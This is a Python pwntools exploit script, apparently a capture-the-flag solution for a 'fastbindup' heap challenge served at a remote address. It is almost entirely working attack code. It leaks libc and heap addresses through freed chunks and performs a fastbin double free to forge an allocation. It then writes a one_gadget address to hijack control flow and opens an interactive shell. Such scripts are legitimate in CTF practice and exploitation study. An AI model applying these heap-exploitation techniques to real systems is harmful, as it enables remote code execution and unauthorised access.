from pwn import *
import re

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''
libc = ELF("./libc.so.6")
context.terminal = ['tmux', 'splitw', '-h']
#p=process("./fastbindup")
p=remote("207.154.239.148", 1348)
#p=gdb.debug("./fastbindup", gdbscript=gs)
#gdb.attach(p)

def malloc(ind, size):
    global p
    r1 = p.sendlineafter(b">", b"1")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">", str(size).encode())
    #r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3#+r4

def free(ind):
    global p
    r1 = p.sendlineafter(b">", b"2")
    r2 = p.sendlineafter(b">", str(ind).encode())
    return r1+r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">", b"3")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", b"4")
    r2 = p.sendlineafter(b">", str(ind).encode())
    r3 = p.recvuntil(b"You are using")
    return r1+r2+r3

def readLeak(resp):
    rawleak = resp.split(b'which index?\n> ')[1].split(b'\n')[0]
    paddedleak = rawleak.ljust(8, b'\x00')
    leak = u64(paddedleak)
    return leak

freehook_offset = 0x001eee48
mallochook_offset=2018160
system_offset = 0x00052290
leak_offset =  0x1ecbe0
binsh_offset = 0x001b45bd

malloc(0, 0x420)
malloc(1, 0x18)
malloc(2, 0x18)
free(0)
free(1)
free(2)
malloc(3, 0x420)
resp = view(3)
leak = readLeak(resp)
print(hex(leak))
malloc(4,0x18)
resp2 = view(4)
leak2 = readLeak(resp2)
print(hex(leak2))
heap_base = leak2 - 1744
print(hex(heap_base))

glibc_base = leak - leak_offset
print(hex(glibc_base))
system_address =  glibc_base + system_offset
freehook = glibc_base + freehook_offset
onegadget1 = glibc_base + 0xe3b04
onegadget2 = glibc_base + 0xe3b01
onegadget3 = glibc_base + 0xe3afe
for i in range(5, 5+7+3):
    malloc(i, 0x28)
    edit(i, p64(0x31)*5)

malloc(20, 0x38)
edit(20, p64(0x31)*7)
malloc(21, 0x38)
edit(21, b"TargetTargetTarget")
malloc(22, 0x38)
free(20)
free(21)

malloc(50, 0x18)
edit(50, b"/bin/sh")

for i in range(5, 5+7):
    free(i)

free(12)
free(13)
free(12)

target = 2240 + heap_base

for i in range(7):
    malloc(60+i, 0x28)

malloc(70, 0x28)
edit(70, p64(target))
malloc(71, 0x28)
malloc(72, 0x28)
malloc(73, 0x40)
edit(73, b'a'*35 + p64(onegadget2))
malloc(74, 0x28)
p.interactive()